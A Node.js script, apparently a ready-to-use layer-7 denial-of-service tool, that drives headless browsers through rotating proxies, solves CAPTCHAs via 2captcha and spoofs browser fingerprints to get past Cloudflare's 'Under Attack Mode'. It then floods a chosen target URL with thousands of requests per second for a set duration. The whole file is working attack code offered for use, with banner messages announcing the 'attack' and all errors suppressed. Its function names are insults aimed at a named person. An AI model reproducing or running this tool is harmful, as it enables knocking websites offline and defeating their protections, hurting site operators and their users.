const puppeteer = require('puppeteer-extra');
const { Cluster } = require('puppeteer-cluster');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const fs = require('fs');
const v8 = require('v8');

v8.setFlagsFromString('--max_old_space_size=2560');
v8.setFlagsFromString('--max_new_space_size=320');
v8.setFlagsFromString('--optimize_for_size');
v8.setFlagsFromString('--always_compact');
v8.setFlagsFromString('--expose_gc');
global.gc && global.gc();

puppeteer.use(StealthPlugin());
puppeteer.use(RecaptchaPlugin({
  provider: { id: '2captcha', token: 'YOUR_2CAPTCHA_API_KEY' },
  visualFeedback: true
}));

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  rps: parseInt(process.argv[4]) || 20000,
  threads: parseInt(process.argv[5]) || 10,
  proxyFile: process.argv[6]
};

if (process.argv.length < 5) {
  console.log("node uam.js <target> <time> <rps> <threads> <proxyFile>");
  process.exit(1);
}

const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(line => line.trim());
let proxyIndex = 0;
const getProxy = () => {
  const proxy = proxies[proxyIndex % proxies.length];
  proxyIndex++;
  return proxy;
};

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
];

const getRandomUserAgent = () => {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
};

const getRandomInt = (min, max) => {
  return Math.floor(Math.random() * (max - min + 1)) + min;
};

const parseProxy = (proxyString) => {
  const parts = proxyString.split(':');
  if (parts.length === 4) {
    return {
      host: parts[0],
      port: parseInt(parts[1]),
      username: parts[2],
      password: parts[3]
    };
  } else if (parts.length === 2) {
    return {
      host: parts[0],
      port: parseInt(parts[1])
    };
  }
  return null;
};

const ditmetuanhai = async ({ page, data: target }) => {
  const proxy = getProxy();
  const proxyConfig = parseProxy(proxy);
  
  if (proxyConfig.username && proxyConfig.password) {
    await page.authenticate({
      username: proxyConfig.username,
      password: proxyConfig.password
    });
  }
  
  await page.setUserAgent(getRandomUserAgent());
  await page.setViewport({
    width: getRandomInt(1024, 1920),
    height: getRandomInt(768, 1080),
    deviceScaleFactor: 1
  });
  
  await page.evaluateOnNewDocument(() => {
    Object.defineProperty(navigator, 'webdriver', {
      get: () => undefined,
    });
    
    Object.defineProperty(navigator, 'plugins', {
      get: () => [
        {
          0: {type: "application/x-google-chrome-pdf"},
          description: "Portable Document Format",
          filename: "internal-pdf-viewer",
          length: 1,
          name: "Chrome PDF Plugin"
        }
      ],
    });
    
    Object.defineProperty(navigator, 'languages', {
      get: () => ['en-US', 'en'],
    });
    
    window.chrome = {
      app: {
        isInstalled: false,
      },
      webstore: {
        onInstallStageChanged: {},
        onDownloadProgress: {},
      },
      runtime: {
        PlatformOs: {
          MAC: 'mac',
          WIN: 'win',
          ANDROID: 'android',
          CROS: 'cros',
          LINUX: 'linux',
          OPENBSD: 'openbsd',
        },
        PlatformArch: {
          ARM: 'arm',
          X86_32: 'x86-32',
          X86_64: 'x86-64',
        },
        PlatformNaclArch: {
          ARM: 'arm',
          X86_32: 'x86-32',
          X86_64: 'x86-64',
        },
        RequestUpdateCheckStatus: {
          THROTTLED: 'throttled',
          NO_UPDATE: 'no_update',
          UPDATE_AVAILABLE: 'update_available',
        }
      }
    };
  });
  
  await page.setDefaultNavigationTimeout(30000);
  
  try {
    await page.goto(target, { 
      waitUntil: 'domcontentloaded',
      timeout: 20000 
    });
    
    const cookies = await page.cookies();
    const cfClearance = cookies.find(cookie => cookie.name === 'cf_clearance');
    const cfChlRc = cookies.find(cookie => cookie.name === 'cf_chl_rc');
    const cfChlRcNi = cookies.find(cookie => cookie.name === 'cf_chl_rc_ni');
    
    if (cfClearance || cfChlRc || cfChlRcNi) {
      console.log(`[+] Got UAM cookies with proxy: ${proxy}`);
      
      const tuanhaisucvat = async () => {
        try {
          const requestsPerBatch = Math.ceil(args.rps / args.threads);
          
          for (let i = 0; i < requestsPerBatch; i++) {
            await page.evaluate(() => {
              return fetch(window.location.href, {
                method: 'GET',
                headers: {
                  'Cache-Control': 'no-cache',
                  'Pragma': 'no-cache',
                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                  'Accept-Language': 'en-US,en;q=0.5',
                  'Accept-Encoding': 'gzip, deflate, br',
                  'Connection': 'keep-alive',
                  'Upgrade-Insecure-Requests': '1',
                  'Sec-Fetch-Dest': 'document',
                  'Sec-Fetch-Mode': 'navigate',
                  'Sec-Fetch-Site': 'none',
                  'Sec-Fetch-User': '?1'
                }
              }).catch(() => {});
            });
            
            if (i % 5 === 0) {
              await new Promise(resolve => setTimeout(resolve, 1));
            }
          }
          
          setTimeout(tuanhaisucvat, 1000);
        } catch (error) {
          setTimeout(tuanhaisucvat, 1000);
        }
      };
      
      setTimeout(tuanhaisucvat, 1000);
    } else {
      setTimeout(() => ditmetuanhai({ page, data: target }), 2000);
    }
  } catch (error) {
    setTimeout(() => ditmetuanhai({ page, data: target }), 2000);
  }
};

const tuanhaiaisucvat = async () => {
  console.log(`[!] Starting L7 UAM Proxy Bypass Attack...`);
  console.log(`[>] Target: ${args.target}`);
  console.log(`[>] Time: ${args.time}s`);
  console.log(`[>] Target RPS: ${args.rps.toLocaleString()}`);
  console.log(`[>] Threads: ${args.threads}`);
  console.log(`[>] Proxies: ${proxies.length}`);
  console.log(`[>] Memory Limit: 3GB RAM`);
  
  const cluster = await Cluster.launch({
    puppeteer,
    maxConcurrency: args.threads,
    puppeteerOptions: {
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--no-first-run',
        '--no-zygote',
        '--disable-gpu',
        '--single-process',
        '--window-size=1024,768',
        '--disable-blink-features=AutomationControlled',
        '--proxy-server=' + getProxy()
      ]
    }
  });
  
  await cluster.task(ditmetuanhai);
  
  for (let i = 0; i < args.threads; i++) {
    cluster.queue(args.target);
  }
  
  setInterval(() => {
    global.gc && global.gc();
  }, 5000);
  
  setTimeout(async () => {
    await cluster.idle();
    await cluster.close();
    console.log(`[!] Attack finished. Exiting...`);
    process.exit(0);
  }, args.time * 1000);
};

tuanhaiaisucvat().catch(error => {
  process.exit(1);
});

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
